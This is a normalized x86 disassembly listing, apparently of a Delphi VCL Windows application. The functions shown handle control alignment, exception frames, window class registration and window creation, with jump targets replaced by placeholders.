jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_4494d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4494d8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_4493e6 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_449349
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_4494d8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_449507 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_449590
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_449d84
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4183f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_418550
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_449150
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_449d48
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_4185cc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_418550
mov edx eax
mov ecx ebx
mov eax edi
call sub_4490c4
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_449700
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_449d84
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_449d48
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_449d48
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_449754
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_449700
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_449833
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_449590
pop ecx
push ebp
mov al 0x2
call sub_449590
pop ecx
push ebp
mov al 0x3
call sub_449590
pop ecx
push ebp
mov al 0x4
call sub_449590
pop ecx
push ebp
mov al 0x5
call sub_449590
pop ecx
push ebp
mov al 0x6
call sub_449590
pop ecx
push ebp
xor eax eax
call sub_449590
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403270
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_40346c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_449858
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d358
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4498ec
xor eax eax
push ebp
push sub_4498df
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_4498f4
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_44991c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4499e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_446168
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_449d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4499e8
mov eax [ ebp - 0xc ]
call sub_403270
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_449d48
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4183f4
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_445ed4
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418550
xor ecx ecx
mov edx 0xb03e
call sub_44790c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_449d48
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_4499f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_449d84
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4498ec
xor edx edx
push ebp
push sub_449ad7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_449d84
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_449d48
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4183f4
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_418550
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403270
mov eax [ ebp - 0x4 ]
call sub_4498f4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_449d48
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_445c78
mov dl 0x4
call sub_445c78
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_418440
sub_449b44
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45e10c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_461f28
sub_449b64
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_445058
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_445058
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_445058
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_449bb0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_445080
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_445080
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_445080
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_449bf8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40346c
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_44790c
mov edx ebx
mov eax edi
call sub_449b64
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_44790c
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44790c
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax edi
call sub_44d358
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_44790c
mov eax edi
call sub_44a748
jmp r-xdata
mov edx ebx
mov eax edi
call sub_449858
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_449ccc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_44790c
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax esi
call sub_44d358
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_449b44
mov eax ebp
call sub_44a5ac
jmp r-xdata
mov edx ebx
mov eax esi
call sub_449bb0
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_44790c
mov eax esi
call sub_449914
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_446bac
sub_449d48
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_418550
mov edx edi
mov eax ebp
call sub_418550
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_449da4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_449d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_449d48
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_449de4
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_449da4
add esp 0x10
retn
sub_449e0c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_449e78
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_446d9c
test al al
je r-xdata
mov eax ebx
call sub_446dcc
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_40346c
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_40346c
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_40346c
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_449ee0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_449ffe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402c84
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_449e78
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_44d054
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031c0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40424c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408778
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a005
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_44a00c
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44a1cd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_443558
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_443558
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40ca34
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40ca34
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408918
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_44d364
push 0x1
mov eax [ esi + 0x68 ]
call sub_42392c
mov ecx eax
mov edx 0x30
mov eax esi
call sub_44790c
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_44d054
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a1d4
lea eax [ ebp - 0xc0 ]
call sub_403fe8
retn
mov eax esi
mov si 0xffee
call sub_40346c
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_44a1dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406c34
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_44a21c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cba8
mov eax esi
call sub_41caf8
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41caf8
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41cbb0
pop esi
pop ebx
retn
sub_44a254
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41edb4
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41ece8
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41ece8
mov eax esi
call sub_41edbc
add esp 0x10
pop esi
pop ebx
retn
sub_44a2bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_44a2a8
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
